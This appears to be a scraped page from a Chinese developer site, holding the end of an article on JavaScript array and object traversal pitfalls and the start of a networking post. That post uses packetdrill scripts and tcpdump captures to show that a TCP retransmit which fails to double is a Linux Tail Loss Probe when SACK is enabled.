<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> num <span class="hljs-keyword">of</span> arr) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 输出: 1, 2, 3</span>
}
</code></pre>
</li>
<li>
<p>使用<code>Object.keys()</code>过滤数字索引：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(arr).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isNaN</span>(<span class="hljs-title class_">Number</span>(key))) { <span class="hljs-comment">// 仅处理数字索引</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr[key]); <span class="hljs-comment">// 输出: 1, 2, 3</span>
  }
});
</code></pre>
</li>
<li>
<p>避免给数组添加非数字属性（遵循数组的设计初衷）。</p>
</li>
</ul>
<h4 data-id="heading-30">2. reduce () 方法的初始值问题</h4>
<p><strong>问题</strong>：reduce () 方法在数组为空或未提供初始值时，行为不符合预期。</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 问题1：空数组无初始值 → 抛出TypeError</span>
[].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num); <span class="hljs-comment">// Uncaught TypeError: Reduce of empty array with no initial value</span>

<span class="hljs-comment">// 问题2：数组只有一个元素无初始值 → 直接返回该元素，不调用回调</span>
[<span class="hljs-number">5</span>].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num); <span class="hljs-comment">// 5（回调未执行）</span>
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>
<p>始终提供初始值（推荐）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sum = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>); <span class="hljs-comment">// 6</span>
<span class="hljs-keyword">const</span> emptySum = [].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0（无错误）</span>
</code></pre>
</li>
<li>
<p>明确处理边界情况（数组可能为空时）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> array = [];
<span class="hljs-keyword">const</span> sum = array.<span class="hljs-property">length</span> === <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num);
</code></pre>
</li>
</ul>
<h4 data-id="heading-31">3. Symbol 键的遍历问题</h4>
<p><strong>问题</strong>：Symbol 类型的键无法被<code>for...in</code>、<code>Object.keys()</code>等方法捕获，导致遍历不完整。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'id'</span>)]: <span class="hljs-number">123</span>,
  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'secret'</span>)]: <span class="hljs-string">'abc'</span>
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj)); <span class="hljs-comment">// 输出: ['name']（未包含Symbol键）</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 输出: 'name'（未包含Symbol键）</span>
}
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>
<p>使用<code>Reflect.ownKeys()</code>遍历所有自有属性键（包括 Symbol）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allKeys = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(allKeys); <span class="hljs-comment">// 输出: ['name', Symbol(id), Symbol(secret)]</span>
</code></pre>
</li>
<li>
<p>使用<code>Object.getOwnPropertySymbols()</code>专门获取 Symbol 键：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> symbols = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(symbols); <span class="hljs-comment">// 输出: [Symbol(id), Symbol(secret)]</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-32">4. 高阶函数的回调参数误用</h4>
<p><strong>问题</strong>：map、filter 等高阶函数的回调参数误用（如混淆参数顺序、遗漏参数），导致意外结果。</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 问题1：map回调参数顺序错误（误将index作为value）</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>];
<span class="hljs-keyword">const</span> parsed = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">index, value</span>) =&gt;</span> <span class="hljs-built_in">parseInt</span>(value)); 
<span class="hljs-comment">// 输出: [NaN, NaN, NaN]（参数顺序颠倒）</span>

<span class="hljs-comment">// 问题2：filter回调未返回布尔值</span>
<span class="hljs-keyword">const</span> evenNumbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>; <span class="hljs-comment">// 遗漏return，默认返回undefined → 转换为false</span>
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenNumbers); <span class="hljs-comment">// 输出: []（所有元素都被过滤）</span>
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>
<p>明确回调函数参数顺序：</p>
<ul>
<li>map/filter 回调：<code>(currentValue, index, array)</code>；</li>
<li>reduce 回调：<code>(accumulator, currentValue, index, array)</code>。</li>
</ul>
</li>
<li>
<p>确保 filter 回调返回布尔值：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 正确示例</span>
<span class="hljs-keyword">const</span> parsed = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-built_in">parseInt</span>(value)); <span class="hljs-comment">// 输出: [1, 2, 3]</span>
<span class="hljs-keyword">const</span> evenNumbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>); <span class="hljs-comment">// 输出: [2, 4]</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-33">5. 遍历过程中修改数组的问题</h4>
<p><strong>问题</strong>：在<code>forEach</code>、<code>for...of</code>等循环中修改数组（如删除、添加元素），导致遍历不完整或重复遍历。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 问题：删除元素后，数组长度变化，导致某些元素被跳过</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">num, index</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    arr.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>); <span class="hljs-comment">// 删除当前元素</span>
  }
});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// 输出: [1, 3, 5]？实际输出: [1, 3, 5]（看似正确，但逻辑有风险）</span>

<span class="hljs-comment">// 问题升级：数组长度变化导致遍历异常</span>
<span class="hljs-keyword">const</span> arr2 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr2.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">if</span> (arr2[i] === <span class="hljs-number">2</span>) {
    arr2.<span class="hljs-title function_">splice</span>(i, <span class="hljs-number">1</span>); <span class="hljs-comment">// 删除索引1的元素，数组变为[1,3,4,5]</span>
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr2[i]); <span class="hljs-comment">// 输出: 1, 3, 4, 5（跳过了3之后的元素？实际输出：1,3,4,5）</span>
}
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>
<p>使用<code>filter</code>创建新数组（推荐，无副作用）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> filtered = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> !== <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(filtered); <span class="hljs-comment">// 输出: [1, 3, 5]（原数组不变）</span>
</code></pre>
</li>
<li>
<p>传统 for 循环从后往前遍历（修改原数组时）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = arr.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
  <span class="hljs-keyword">if</span> (arr[i] % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    arr.<span class="hljs-title function_">splice</span>(i, <span class="hljs-number">1</span>); <span class="hljs-comment">// 从后往前删除，不影响前面的索引</span>
  }
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr); <span class="hljs-comment">// 输出: [1, 3, 5]</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-34">结论</h3>
<p>JavaScript 提供了丰富的遍历方法，每种方法都有其独特的适用场景和优缺点。掌握这些方法的核心差异和最佳实践，能帮助开发者编写更高效、更安全、更易维护的代码。</p>
<h4 data-id="heading-35">核心总结</h4>
<ul>
<li>
<p><strong>对象遍历</strong>：优先使用<code>Object.keys()</code>/<code>values()</code>/<code>entries()</code>（安全、高效），避免<code>for...in</code>；需遍历所有自有属性（包括不可枚举、Symbol）时使用<code>Reflect.ownKeys()</code>。</p>
</li>
<li>
<p><strong>数组遍历</strong>：</p>
<ul>
<li>需控制索引或中断循环：传统 for 循环；</li>
<li>仅遍历元素：<code>for...of</code>；</li>
<li>转换元素：<code>map()</code>；</li>
<li>筛选元素：<code>filter()</code>；</li>
<li>累积计算：<code>reduce()</code>；</li>
<li>函数式编程：优先组合使用<code>map</code>、<code>filter</code>、<code>reduce</code>。</li>
</ul>
</li>
<li>
<p><strong>ESLint 规范</strong>：遵循<code>no-for-in</code>、<code>prefer-map</code>等规则，避免常见错误。</p>
</li>
<li>
<p><strong>最佳实践</strong>：使用纯函数、避免副作用、处理边界情况（如空数组、Symbol 键）。</p>
</li>
</ul>
<p>在实际开发中，应根据具体需求（如是否需要索引、是否修改数组、是否返回结果）选择合适的遍历方法，避免盲目追求 “流行” 方法。同时，结合 ESLint 等工具确保代码规范，提高代码质量和团队协作效率。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Wireshark TS | 超时重传时间不翻倍]]></title>    <link>https://juejin.cn/post/7589962224795762726</link>    <guid>https://juejin.cn/post/7589962224795762726</guid>    <pubDate>2026-01-02T06:38:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795762726" data-draft-id="7589958976226557962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Wireshark TS | 超时重传时间不翻倍"/> <meta itemprop="keywords" content="Wireshark,TCP/IP,网络协议"/> <meta itemprop="datePublished" content="2026-01-02T06:38:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="7ACE"/> <meta itemprop="url" content="https://juejin.cn/user/4033458369739741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Wireshark TS | 超时重传时间不翻倍
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4033458369739741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    7ACE
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:38:01.000Z" title="Fri Jan 02 2026 06:38:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>看图猜故障系列，来自于技术群讨论的又一个问题，数据包如下图，No.4900 原始数据包，No.4901 间隔208ms第一次重传，No.4903 间隔208ms第二次重传。</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aecb2aafa0d84c0faf743008b4fbfaa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgN0FDRQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767940681&amp;x-signature=2NG%2Fiu4ZxywZHPStU7GDT3bFzZE%3D" alt="" loading="lazy"/></p>
<p><strong>问题就是数据包第二次超时重传，间隔时间为什么没有翻倍。</strong></p>
<h2 data-id="heading-1">问题分析</h2>
<p>说实话，刚看到这个数据包文件截图时，记忆中竟然没有一丝相似的故障现象，略感纳闷。实际解读，也没有特别反常的迹象，只是在间隔 384s 后，客户端所发送的数据段由于得不到 ACK 确认，进行了重传的过程。当然由于第二次重传的超时时间未翻倍的原因，所以首先我并没有把这些重传全部定义为是超时重传。</p>
<p>但既然是一个数据段的重传，没有其他输入的信息，那么可以先简单模拟超时重传，对比看下。</p>
<pre><code class="hljs language-plain" lang="plain"># cat test.pkt 
0  socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

+0 &lt; S 0:0(0) win 10000 &lt;mss 1000&gt;
+0 &gt; S. 0:0(0) ack 1 &lt;...&gt;
+0.01 &lt; . 1:1(0) ack 1 win 10000
+0 accept(3, ..., ...) = 4

+0.1 write(4,...,100) = 100

+0 `sleep 5`
#
</code></pre>
<p>执行脚本，同时通过 tcpdump 抓取数据包，现象如下。</p>
<p>可以看到发出数据段后，第一次重传间隔时间为213ms，而第二次重传间隔时间为436ms，也就是说都符合超时重传的现象，超时时间是正常翻倍了。</p>
<pre><code class="hljs language-plain" lang="plain"># packetdrill test.pkt
#


# tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
22:25:38.983501 tun0  In  IP 192.0.2.1.34827 &gt; 192.168.209.238.8080: Flags [S], seq 0, win 10000, options [mss 1000], length 0
22:25:38.983536 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [S.], seq 3745491915, ack 1, win 64240, options [mss 1460], length 0
22:25:38.993637 tun0  In  IP 192.0.2.1.34827 &gt; 192.168.209.238.8080: Flags [.], ack 1, win 10000, length 0
22:25:39.093744 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:39.307178 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:39.743184 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:40.607187 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:25:42.335186 tun0  Out IP 192.168.209.238.8080 &gt; 192.0.2.1.34827: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<p>当然，由于第一个测试并没有支持 SACK，因此继续可以增加尝试测试。</p>
<pre><code class="hljs language-plain" lang="plain"># cat test.pkt 
0  socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

+0 &lt; S 0:0(0) win 10000 &lt;mss 1000,nop,nop,sackOK&gt;
+0 &gt; S. 0:0(0) ack 1 &lt;...&gt;
+0.01 &lt; . 1:1(0) ack 1 win 10000
+0 accept(3, ..., ...) = 4

+0.1 write(4,...,100) = 100

+0 `sleep 5`
#
</code></pre>
<p>执行脚本，同时通过 tcpdump 抓取数据包，现象如下。</p>
<p>可以看到发出数据段后，第一次重传间隔时间为213ms，而第二次重传间隔时间为216ms，和问题截图一模一样的现象，第二次重传的超时时间并未翻倍。</p>
<pre><code class="hljs language-plain" lang="plain"># packetdrill test.pkt
#


# tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
22:35:37.983481 tun0  In  IP 192.0.2.1.54829 &gt; 192.168.44.251.8080: Flags [S], seq 0, win 10000, options [mss 1000,nop,nop,sackOK], length 0
22:35:37.983508 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [S.], seq 2010255923, ack 1, win 64240, options [mss 1460,nop,nop,sackOK], length 0
22:35:37.993598 tun0  In  IP 192.0.2.1.54829 &gt; 192.168.44.251.8080: Flags [.], ack 1, win 10000, length 0
22:35:38.093722 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:38.307185 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:38.523213 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:38.975187 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:39.839188 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
22:35:41.567190 tun0  Out IP 192.168.44.251.8080 &gt; 192.0.2.1.54829: Flags [P.], seq 1:101, ack 1, win 64240, length 100: HTTP
#
</code></pre>
<p>通过两次实验对比，可知仅仅是增加了 SACK 的支持，就产生了不一样的结果，同时结合数据包的重传时间，可以判断出第一次重传并不是普通的超时重传，而在它发出之后，看到的第二次重传，才是真正的第一次超时重传，之后的也才是 RTO 不断翻倍后的超时重传过程。</p>
<p>那么第一次重传是什么？<strong>在 linux 系统中，它实际是一个 TLP 数据包，在SACK开启下，TLP 会重传强制传输还没有收到 ACK 确认的报文里面的最后一个报文或者未发送的新报文。</strong> 而在上面的测试以及问题截图场景中，也比较特殊，因为只发送了一个报文，所以第一次重传也就是发送了 TLP 定义中的最后一个报文，乍看起来，确实像是在进行超时重传。</p>
<h2 data-id="heading-2">TLP 介绍</h2>
<p>Tail Loss Probe (TLP)是一个发送端算法，主要目的是使用快速重传取代RTO超时重传来处理尾包丢失场景。如果TCP尾包丢失，如果依靠RTO超时进行重传会带来比较大的延迟，进而影响用户体验。</p>
<p>那么如果一个TCP连接没有在一段时间内没有收到ACK报文，TLP会强制传输还没有收到ACK确认的报文里面的最后一个报文或者未发送的新报文(传输的这个报文就叫做loss probe)。</p>
<p><strong>tcp_early_retrans - INTEGER</strong></p>
<p>Enable Early Retransmit (ER), per RFC 5827. ER lowers the threshold for triggering fast retransmit when the amount of outstanding data is small and when no previously unsent data can be transmitted (such that limited transmit could be used). Also controls the use of Tail loss probe (TLP) that converts RTOs occurring due to tail losses into fast recovery (draft-dukkipati-tcpm-tcp-loss-probe-01).</p>
<p>Possible values:</p>
<p>0 disables ER</p>
<p>1 enables ER</p>
<p>2 enables ER but delays fast recovery and fast retransmit by a fourth of RTT. This mitigates connection falsely recovers when network has a small degree of reordering (less than 3 packets).</p>
<p>3 enables delayed ER and TLP.</p>
<p>4 enables TLP only.</p>
<p>Default: 3</p>
<h2 data-id="heading-3">证明实验</h2>
<p>在 linux 中 <strong>tcp_early_retrans</strong> 参数默认值为 3，也就是同时启用了 Delayed ER 和 TLP。</p>
<pre><code class="hljs language-plain" lang="plain"># sysctl -a|grep early_retrans
net.ipv4.tcp_early_retrans = 3
# 
</code></pre>
<p>如果想证明确实和 TLP 相关，可以从三个方面测试下：</p>
<ol>
<li>关闭 SACK；（上述实验已测试）</li>
<li>net.ipv4.tcp_early_retrans 值修改为 4，仅开启 TLP；</li>
<li>net.ipv4.tcp_early_retrans 值修改为 0，关闭 ER 以及 TLP。</li>
</ol>
<p>首先仅开启 TLP 的情况，继续测试在 SACK 开启的脚本。</p>
<pre><code class="hljs language-plain" lang="plain"># sysctl -q net.ipv4.tcp_early_retrans=4
# sysctl -a|grep early_retrans
net.ipv4.tcp_early_retrans = 4
# 
</code></pre>
<p>执行脚本，同时通过 tcpdump 抓取数据包，现象如下，可以看到与默认值 3 的测试结果一致，说明了和 ER 重传无关，与 TLP 可能有关（严谨的说法，因为也有可能是某某重传引起）。</p>
<pre><code class="hljs language-plain" lang="plain"># tcpdump -i any -nn port 8080
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
10:12:36.563494 tun0  In  IP 192.0.2.1.50647 &gt; 192.168.165.47.8080: Flags [S], seq 0, win 10000, options [mss 1000,nop,nop,sackOK], length 0
10:12:36.563526 tun0  Out IP 192.168.165.47.8080 &gt; 192.0.2.1.50647: Flags [S.], seq 3170095082, ack 1, win 64240, options [mss 1460,nop,nop,sackOK], length 0
10:12:36.573627 tun0  In  IP 192.0.2.1.50647 &gt; 192.168.165.47.8080: Flags [.], ack 1, win 10000, length 0
